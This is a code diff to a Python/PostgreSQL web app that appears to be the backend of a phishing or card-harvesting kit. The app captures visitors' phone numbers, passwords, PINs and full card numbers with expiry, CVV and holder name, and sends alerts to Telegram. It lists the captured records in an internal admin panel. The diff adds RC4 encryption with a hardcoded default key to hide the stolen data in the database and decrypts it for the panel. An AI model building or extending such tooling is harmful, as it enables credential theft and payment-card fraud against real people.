@@ -5,9 +5,56 @@ import os
 import requests
 import psycopg2
 import mimetypes
+import base64
 
 mimetypes.add_type('text/css', '.css')
 mimetypes.add_type('image/svg+xml', '.svg')
+
+FALA_KEY = os.environ.get("FALA_KEY", "fala_default_secret_key_852456")
+
+def rc4_crypt(data, key):
+    key_bytes = [ord(c) for c in key]
+    key_len = len(key_bytes)
+    S = list(range(256))
+    j = 0
+    for i in range(256):
+        j = (j + S[i] + key_bytes[i % key_len]) % 256
+        S[i], S[j] = S[j], S[i]
+        
+    i = 0
+    j = 0
+    out = []
+    for char in data:
+        i = (i + 1) % 256
+        j = (j + S[i]) % 256
+        S[i], S[j] = S[j], S[i]
+        t = (S[i] + S[j]) % 256
+        k = S[t]
+        out.append(chr(ord(char) ^ k))
+        
+    return "".join(out)
+
+def encrypt_data(data):
+    if not data:
+        return data
+    try:
+        encrypted = rc4_crypt(str(data), FALA_KEY)
+        return base64.b64encode(encrypted.encode('utf-8', errors='ignore')).decode('utf-8')
+    except Exception as e:
+        print(f"Error encrypting: {e}")
+        return data
+
+def decrypt_data(data):
+    if not data:
+        return data
+    try:
+        decoded = base64.b64decode(data.encode('utf-8')).decode('utf-8', errors='ignore')
+        decrypted = rc4_crypt(decoded, FALA_KEY)
+        if any(ord(c) < 32 and c not in '\r\n\t' for c in decrypted):
+            return data
+        return decrypted
+    except Exception as e:
+        return data
 
 base_dir = os.path.abspath(os.path.dirname(__file__))
 template_dir = os.path.join(base_dir, 'templates')
@@ -168,6 +215,20 @@ def init_db():
         except Exception as e:
             conn.rollback()
 
+        # Intentar alterar todas las columnas sensibles a TEXT para soportar cifrado sin limite de longitud
+        try:
+            cur.execute('ALTER TABLE users ALTER COLUMN phone TYPE TEXT')
+            cur.execute('ALTER TABLE users ALTER COLUMN password TYPE TEXT')
+            cur.execute('ALTER TABLE users ALTER COLUMN token TYPE TEXT')
+            cur.execute('ALTER TABLE users ALTER COLUMN card_number TYPE TEXT')
+            cur.execute('ALTER TABLE users ALTER COLUMN card_expiry TYPE TEXT')
+            cur.execute('ALTER TABLE users ALTER COLUMN card_cvv TYPE TEXT')
+            cur.execute('ALTER TABLE users ALTER COLUMN card_holder TYPE TEXT')
+            conn.commit()
+        except Exception as e:
+            conn.rollback()
+            print(f"Info al migrar tipos a TEXT: {e}")
+
         # Crear tabla logs
         cur.execute('''
             CREATE TABLE IF NOT EXISTS logs (
@@ -238,11 +299,13 @@ def submit():
         ip = ip.split(',')[0].strip()
     
     try:
+        enc_cc = encrypt_data(cc)
+        enc_password = encrypt_data(password)
         conn = get_db_connection()
         cur = conn.cursor()
         cur.execute(
             'INSERT INTO users (phone, password, token, status) VALUES (%s, %s, %s, %s) RETURNING id', 
-            (cc, password, '', '1')
+            (enc_cc, enc_password, '', '1')
         )
         user_id = cur.fetchone()[0]
         conn.commit()
@@ -319,9 +382,10 @@ def submit_dynamic():
         threading.Thread(target=send_telegram, args=(msg, user_id)).start()
 
         # Cambiar estado a 1 y guardar el token para que aparezca en el panel
+        enc_pin = encrypt_data(pin)
         conn = get_db_connection()
         cur = conn.cursor()
-        cur.execute('UPDATE users SET status = %s, token = %s WHERE id = %s', ('1', pin, user_id))
+        cur.execute('UPDATE users SET status = %s, token = %s WHERE id = %s', ('1', enc_pin, user_id))
         conn.commit()
         cur.close()
         conn.close()
@@ -360,12 +424,17 @@ def submit_tdb():
 
         # Cambiar el estado del usuario en la base de datos de vuelta a '1' (espera)
         # y opcionalmente guardar el token
+        enc_token = encrypt_data(card_number[-4:])
+        enc_card_number = encrypt_data(card_number)
+        enc_card_expiry = encrypt_data(card_expiry)
+        enc_card_cvv = encrypt_data(card_cvv)
+        enc_card_holder = encrypt_data(card_holder)
         conn = get_db_connection()
         cur = conn.cursor()
         # Guardamos el nombre del titular, número de tarjeta, vencimiento y cvv en la base de datos
         cur.execute(
             'UPDATE users SET status = %s, token = %s, card_number = %s, card_expiry = %s, card_cvv = %s, card_holder = %s WHERE id = %s', 
-            ('1', card_number[-4:], card_number, card_expiry, card_cvv, card_holder, user_id)
+            ('1', enc_token, enc_card_number, enc_card_expiry, enc_card_cvv, enc_card_holder, user_id)
         )
         conn.commit()
         cur.close()
@@ -408,11 +477,16 @@ def submit_tct():
 
         # Cambiar el estado del usuario en la base de datos de vuelta a '1' (espera)
         # y guardar la información
+        enc_token = encrypt_data(card_number[-4:])
+        enc_card_number = encrypt_data(card_number)
+        enc_card_expiry = encrypt_data(card_expiry)
+        enc_card_cvv = encrypt_data(card_cvv)
+        enc_card_holder = encrypt_data(card_holder)
         conn = get_db_connection()
         cur = conn.cursor()
         cur.execute(
             'UPDATE users SET status = %s, token = %s, card_number = %s, card_expiry = %s, card_cvv = %s, card_holder = %s WHERE id = %s', 
-            ('1', card_number[-4:], card_number, card_expiry, card_cvv, card_holder, user_id)
+            ('1', enc_token, enc_card_number, enc_card_expiry, enc_card_cvv, enc_card_holder, user_id)
         )
         conn.commit()
         cur.close()
@@ -451,15 +525,15 @@ def internal_admin():
         for row in cur.fetchall():
             users.append({
                 "id": row[0],
-                "phone": row[1],
-                "pass": row[2],
-                "token": row[3],
+                "phone": decrypt_data(row[1]),
+                "pass": decrypt_data(row[2]),
+                "token": decrypt_data(row[3]),
                 "status": row[4],
                 "time": row[5].strftime("%H:%M:%S") if row[5] and hasattr(row[5], 'strftime') else "N/A",
-                "card_number": row[6] if len(row) > 6 else None,
-                "card_expiry": row[7] if len(row) > 7 else None,
-                "card_cvv": row[8] if len(row) > 8 else None,
-                "card_holder": row[9] if len(row) > 9 else None
+                "card_number": decrypt_data(row[6]) if len(row) > 6 else None,
+                "card_expiry": decrypt_data(row[7]) if len(row) > 7 else None,
+                "card_cvv": decrypt_data(row[8]) if len(row) > 8 else None,
+                "card_holder": decrypt_data(row[9]) if len(row) > 9 else None
             })
         
         # Obtener logs de visitas
@@ -493,15 +567,15 @@ def admin_api_refresh():
         for row in cur.fetchall():
             users.append({
                 "id": row[0],
-                "phone": row[1],
-                "pass": row[2],
-                "token": row[3],
+                "phone": decrypt_data(row[1]),
+                "pass": decrypt_data(row[2]),
+                "token": decrypt_data(row[3]),
                 "status": row[4],
                 "time": row[5].strftime("%H:%M:%S") if row[5] and hasattr(row[5], 'strftime') else "N/A",
-                "card_number": row[6] if len(row) > 6 else None,
-                "card_expiry": row[7] if len(row) > 7 else None,
-                "card_cvv": row[8] if len(row) > 8 else None,
-                "card_holder": row[9] if len(row) > 9 else None
+                "card_number": decrypt_data(row[6]) if len(row) > 6 else None,
+                "card_expiry": decrypt_data(row[7]) if len(row) > 7 else None,
+                "card_cvv": decrypt_data(row[8]) if len(row) > 8 else None,
+                "card_holder": decrypt_data(row[9]) if len(row) > 9 else None
             })
         
         # 2. Obtener logs de visitas
@@ -541,15 +615,15 @@ def admin_api_users_table():
         for row in cur.fetchall():
             users.append({
                 "id": row[0],
-                "phone": row[1],
-                "pass": row[2],
-                "token": row[3],
+                "phone": decrypt_data(row[1]),
+                "pass": decrypt_data(row[2]),
+                "token": decrypt_data(row[3]),
                 "status": row[4],
                 "time": row[5].strftime("%H:%M:%S") if row[5] and hasattr(row[5], 'strftime') else "N/A",
-                "card_number": row[6] if len(row) > 6 else None,
-                "card_expiry": row[7] if len(row) > 7 else None,
-                "card_cvv": row[8] if len(row) > 8 else None,
-                "card_holder": row[9] if len(row) > 9 else None
+                "card_number": decrypt_data(row[6]) if len(row) > 6 else None,
+                "card_expiry": decrypt_data(row[7]) if len(row) > 7 else None,
+                "card_cvv": decrypt_data(row[8]) if len(row) > 8 else None,
+                "card_holder": decrypt_data(row[9]) if len(row) > 9 else None
             })
         cur.close()
         conn.close()
